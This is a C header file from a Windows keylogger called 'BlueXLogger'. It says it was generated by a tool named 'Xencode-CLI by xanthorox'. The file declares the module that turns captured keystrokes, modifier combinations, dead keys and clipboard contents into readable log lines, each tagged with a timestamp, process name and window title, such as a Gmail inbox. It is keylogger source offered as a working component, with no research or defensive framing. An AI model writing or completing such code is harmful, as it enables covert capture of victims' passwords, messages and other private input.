/*============================================================================
 * BlueXLogger - bxl_format.h
 * Deterministic key-event -> human-readable text formatter.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * This module is deliberately free of any Windows hook dependency: it takes
 * plain key events in, and produces text out. That makes the whole formatting
 * contract unit-testable without a real keyboard or message pump.
 *
 * Output contract
 * ---------------
 *   printable keys   -> the literal character, cased per Shift/CapsLock
 *   control keys     -> bracketed tokens, e.g. <ENTER> <TAB> <BACKSPACE> <F5>
 *   modifier combos  -> <CTRL+C> <ALT+TAB> <CTRL+SHIFT+ESC> <WIN+R>
 *   dead keys        -> composed with the following base letter where a
 *                       Latin-1/Extended-A composition exists, otherwise
 *                       emitted as <DEAD:accent>
 *   clipboard        -> <CLIPBOARD>text</CLIPBOARD>
 *==========================================================================*/
#ifndef BXL_FORMAT_H
#define BXL_FORMAT_H

#include "bxl_common.h"
#include "bxl_util.h"

/* ---------------------------------------------------------------------------
 * Tracked modifier / lock state
 * -------------------------------------------------------------------------*/
typedef struct BxlModState {
    bxl_u8 shift;
    bxl_u8 ctrl;
    bxl_u8 alt;
    bxl_u8 win;
    bxl_u8 capslock;
    bxl_u8 numlock;
    bxl_u8 scrolllock;

    /* Pending dead key (0 when none). Stored as the VK_DEAD_* code. */
    bxl_u16 dead_pending;

    /* Auto-repeat suppression bookkeeping. */
    bxl_u16 last_special_vk;
    bxl_u32 last_special_run;

    bxl_u8  seeded;   /* set once the host has pushed real lock state in */
} BxlModState;

/* ---------------------------------------------------------------------------
 * A single logical key event, decoupled from any hook struct.
 * -------------------------------------------------------------------------*/
typedef struct BxlKeyEvent {
    bxl_u16 vk;         /* virtual-key code                                */
    bxl_u16 scan;       /* hardware scan code                              */
    bxl_u8  extended;   /* KEYEVENTF_EXTENDEDKEY                          */
    bxl_u8  is_down;    /* 1 = key down, 0 = key up                       */
    bxl_u8  injected;   /* KEYEVENTF_INJECTED / LLKHF_INJECTED            */
    bxl_u8  is_dead;    /* active layout reports this key as a dead key   */
} BxlKeyEvent;

/* ---------------------------------------------------------------------------
 * Formatter policy
 * -------------------------------------------------------------------------*/
typedef struct BxlFmtOptions {
    bxl_u8 suppress_special_repeats; /* collapse runs of one held special key */
    bxl_u8 show_modifier_combos;     /* render <CTRL+X> rather than bare 'x'  */
    bxl_u8 compose_dead_keys;        /* merge dead key + base into one glyph  */
    bxl_u8 track_injected;           /* include events flagged as injected    */
} BxlFmtOptions;

void bxl_fmt_default_options(BxlFmtOptions *opt);

/* ---------------------------------------------------------------------------
 * API
 * -------------------------------------------------------------------------*/

/* Reset all tracked state to "nothing pressed". */
void bxl_fmt_init(BxlModState *st, const BxlFmtOptions *opt);

/* Push the host's authoritative lock-key state (from GetKeyState). */
void bxl_fmt_set_locks(BxlModState *st, int capslock, int numlock, int scrolllock);

/* Apply one key event, appending readable text to out.
 * Returns the number of bytes appended (0 when the event produced nothing,
 * which is normal for modifier key-up/down). */
int bxl_fmt_apply(BxlModState *st, const BxlFmtOptions *opt,
                  const BxlKeyEvent *ev, BxlBuf *out);

/* Apply a batch of events. Returns total bytes appended. */
int bxl_fmt_apply_all(BxlModState *st, const BxlFmtOptions *opt,
                      const BxlKeyEvent *evs, size_t count, BxlBuf *out);

/* Canonical uppercase name for a virtual key, used inside <...> tokens.
 * Returns BXL_FALSE when the key has no canonical name. */
int bxl_fmt_vk_name(bxl_u16 vk, char *out, size_t out_cch);

/* Append a clipboard payload wrapped in markers. Content is sanitised so it
 * cannot break the log line structure. */
int bxl_fmt_clipboard(BxlBuf *out, const char *text, size_t len);

/* Render one log context header line:
 *   [2026-09-13 14:32:07] [chrome.exe - "Inbox - Gmail"]
 * (the separator is an em dash, U+2014) */
int bxl_fmt_context_header(BxlBuf *out, const char *timestamp,
                           const char *process_name, const char *window_title);

/* True when the vk is a modifier key that should never be emitted alone. */
int bxl_fmt_is_modifier(bxl_u16 vk);

/* True when the vk is a dead key. */
int bxl_fmt_is_dead_key(bxl_u16 vk);

#endif /* BXL_FORMAT_H */
